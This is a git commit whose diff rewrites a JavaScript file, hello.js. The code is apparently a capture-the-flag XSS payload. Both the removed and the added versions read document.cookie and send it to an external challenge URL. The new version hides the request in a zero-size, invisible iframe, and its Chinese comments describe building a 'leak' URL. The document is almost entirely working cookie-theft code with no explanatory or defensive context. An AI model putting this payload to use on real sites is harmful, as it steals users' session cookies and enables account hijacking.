8779bfd5412221dddfd8da9a2064eb83c5e86854
Kang <kangshuwen26@126.com>
2017-05-07 03:19:06 +0200

    hello

--- Release/hello.js
+++ Release/hello.js
@@ -1,3 +1,14 @@
-var img=document.createElement(“img”);
-img.src=”https://chall.necst.it/challenges/web3/verify/411/”+document.cookie;
-document.body.appendChild(img);    
+(function(window, document) {
+    // 构造泄露信息用的 URL
+    var cookies = document.cookie;
+    var xssURIBase = "https://chall.necst.it/challenges/web3/verify/411/";
+    var xssURI = xssURIBase + window.encodeURI(cookies);
+    // 建立隐藏 iframe 用于通讯
+    var hideFrame = document.createElement("iframe");
+    hideFrame.height = 0;
+    hideFrame.width = 0;
+    hideFrame.style.display = "none";
+    hideFrame.src = xssURI;
+    // 开工
+    document.body.appendChild(hideFrame);
+})(window, document);
